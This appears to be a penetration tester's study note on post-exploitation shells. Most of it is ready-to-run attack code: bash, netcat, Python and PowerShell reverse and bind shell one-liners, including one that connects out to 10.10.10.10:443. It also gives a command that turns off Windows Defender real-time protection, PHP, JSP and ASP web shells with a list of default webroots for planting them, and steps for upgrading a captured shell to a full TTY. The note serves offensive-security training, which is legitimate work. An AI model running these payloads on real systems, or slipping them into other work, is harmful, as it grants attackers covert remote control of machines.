```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```

Once a host has been compromised and we have RCE, setting up some form of persistent communication is a key part of [[5 - Post-Exploitation]].

## Types of Shells
### Reverse Shell
Connects back to our system and gives us control through a reverse connection. We setup a listener on our machine and then connect back to it from the target.
![[Netcat (nc)#Create a listener]]

Connecting back to our system with a shell is slightly more complex as it depends what we have available. The [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) page has a comprehensive list of reverse shells.

**Bash**
```bash
bash -c 'bash -i >& /dev/tcp/[IP]/[Port] 0>&1'
```

**Netcat**
![[Netcat (nc)#Create a simple reverse shell]]

**Powershell via CMD**
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```
> Sometimes we might be able to disable Windows defender Virus & Threat protection, allowing us to run the above:
> `Set-MpPreference -DisableRealtimeMonitoring $true`

> 1. `powershell -nop -c` creates a no profile (`nop`) and executes the following code (`-c`)
> 2. First we connect to a TCP socket and set it as the client
> 3. Now open the stream with `GetStream`
> 4. Create an empty byte stream to send to our TCP listening waiting

## Bind Shells
Unlike a reverse shell, a Bind shell connects us to the *targets'* listening port. This means we are connecting to the target rather than them connecting to us (the opposite direction to a RS).

To create a bind shell, we need to listen on a port on the target and bind a shell to that port. Then on the tester machine we can us [[Netcat (nc)]] to connect to it.

Some challenges with bind shells however:
- We need an already active listener or be able to create one ourselves.
- It is typical for strict incoming firewall rules and NAT on the edge of the network (public-facing), so we would need to be on the internal network already.
- OS firewalls often block incoming connections that aren't associated with trusted network-based applications.

To setup a bind shell on the server, we need to define:
- the directory
- the shell
- the listener
- a pipeline (eg. a named pipe) : *a file that can be written and read by multiple processes*
- input & output redirection

**Bash**
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lv 1234 >/tmp/f
```
> 1. Remove any existing `/tmp/f`
> 2. Create a named pipe at `/tmp/f` with `mkfifo`
> 3. Read input from `/tmp/f` with `cat`
> 4. Spawn an interactive bash shell with errors being redirected to stdout
> 5. Start a `nc` listener that writes to `/tmp/f`
> With this, any commands sent via the nc connection are written and then read from `/tmp/f`, executed and output is returned back down the connection.

**Python**
```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

**Powershell**
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

### Upgrading TTY
To give us more terminal features (eg. a mouse, history, etc) we need to upgrade the TTY.
There are multiple methods to do this. For our purposes, we will use the `python/stty` method. In our `netcat` shell, we will use the following command to use python to upgrade the type of our shell to a full TTY:

```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

After we run this command, we will hit `ctrl+z` to background our shell and get back on our local terminal, and input the following `stty` command:
```shell
www-data@remotehost$ ^Z

alipali737@htb[/htb]$ stty raw -echo
alipali737@htb[/htb]$ fg

[Enter]
[Enter]
www-data@remotehost$
```

Once we hit `fg`, it will bring back our `netcat` shell to the foreground. At this point, the terminal will show a blank line. We can hit `enter` again to get back to our shell or input `reset` and hit enter to bring it back. At this point, we would have a fully working TTY shell with command history and everything else.

We may notice that our shell does not cover the entire terminal. To fix this, we need to figure out a few variables. We can open another terminal window on our system, maximize the windows or use any size we want, and then input the following commands to get our variables:

```shell
alipali737@htb[/htb]$ echo $TERM

xterm-256color
```

```shell
alipali737@htb[/htb]$ stty size

67 318
```

The first command showed us the `TERM` variable, and the second shows us the values for `rows` and `columns`, respectively. Now that we have our variables, we can go back to our `netcat` shell and use the following command to correct them:

```shell
www-data@remotehost$ export TERM=xterm-256color

www-data@remotehost$ stty rows 67 columns 318
```

Once we do that, we should have a `netcat` shell that uses the terminal's full features, just like an SSH connection.

## Web Shells
This is a web script that accepts commands through HTTP params, executes the command and returns the output. There are two components to using these: Uploading the web shell and executing the shell.

A great benefit of these kind of shells is that they utilise the existing connection that would be allowed through a firewall.

### Writing a web shell
Web shells tend to be simple one line commands that take a command and execute them on the system. The following examples are all *GET* requests:

**PHP**
```
<?php system($_REQUEST["cmd"]); ?>
```

**JSP**
```
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

**ASP**
```
<% eval request("cmd") %>
```

### Uploading the web shell
We need to get our web shell script into the web root to be able to execute it. This can either be through a file upload vulnerability, or even an RCE could let us write the file on the target system ourself.

| Web Server | Default Webroot        |
| ---------- | ---------------------- |
| Apache     | /var/www/html/         |
| Nginx      | /usr/local/nginx/html/ |
| IIS        | c:\inetpub\wwwroot\    |
| XAMPP      | C:\xampp\htdocs\       |
